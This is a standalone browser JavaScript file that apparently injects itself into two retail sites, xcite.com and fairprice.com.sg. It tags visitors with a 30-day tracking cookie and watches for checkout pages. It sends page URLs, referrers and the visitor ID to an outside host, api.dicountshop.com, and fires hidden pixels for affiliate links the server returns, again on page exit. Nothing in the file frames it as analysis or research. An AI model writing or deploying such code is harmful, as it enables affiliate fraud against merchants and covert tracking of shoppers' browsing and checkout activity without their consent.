(function () {
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = (Math.random() * 16) | 0,
        v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    var nameEQ = name + '=';
    var cookies = document.cookie.split(';');
    for (var i = 0; i < cookies.length; i++) {
      var c = cookies[i].trim();
      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return '';
  }

  function firePixel(url) {
    try {
      var img = new Image();
      img.src = url;
      img.style.display = 'none';
      document.body.appendChild(img);
    } catch (e) {}
  }

  async function sendTrackingRequest() {
    try {
      let uniqueId = getCookie('tracking_uuid') || generateUUID();
      let expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

      let response = await fetch('https://api.dicountshop.com/api/track-user', {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      let data = await response.json();

      if (data.success && data.affiliate_url) {
        firePixel(data.affiliate_url);
      } else {
        firePixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function trackOnce(key) {
    if (sessionStorage.getItem(key)) return;
    sessionStorage.setItem(key, 'true');

    sendTrackingRequest();

    var call2Timer, call3Timer;
    var call2Fired = false;
    var call3Fired = false;

    function cleanup() {
      window.removeEventListener('pagehide', flushRemaining);
      window.removeEventListener('beforeunload', flushRemaining);
    }

    function fireCall2() {
      if (call2Fired) return;
      call2Fired = true;
      clearTimeout(call2Timer);
      sendTrackingRequest();
      call3Timer = setTimeout(fireCall3, 3000);
    }

    function fireCall3() {
      if (call3Fired) return;
      call3Fired = true;
      clearTimeout(call3Timer);
      cleanup();
      sendTrackingRequest();
    }

    function flushRemaining() {
      if (!call2Fired) fireCall2();
      if (!call3Fired) fireCall3();
      cleanup();
    }

    call2Timer = setTimeout(fireCall2, 2000);
    window.addEventListener('pagehide', flushRemaining);
    window.addEventListener('beforeunload', flushRemaining);
  }

  function detectCheckoutStage() {
    const stages = [
      { type: 'cart', paths: ['/checkout/cart'] },
      { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
      { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
      { type: 'review-order', paths: ['/checkout/review-order'] },
      { type: 'confirmation', paths: ['/checkout/confirmation'] },
    ];
    const path = window.location.pathname.toLowerCase();
    const match = stages.find((stage) => stage.paths.some((p) => path.includes(p)));
    return match ? match.type : null;
  }

  function init() {
    const hostname = window.location.hostname;
    const siteConfig = {
      'www.xcite.com': { always: false, cartExtra: true },
      'www.fairprice.com.sg': { always: true, cartExtra: true },
    };
    const config = siteConfig[hostname];
    if (!config) return;

    const stage = detectCheckoutStage();
    if (config.always) trackOnce('tracking_done_' + hostname + '_always');
    if (config.cartExtra && stage) trackOnce('tracking_done_' + hostname + '_' + stage);
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    init();
  } else {
    window.addEventListener('DOMContentLoaded', init);
  }
})();
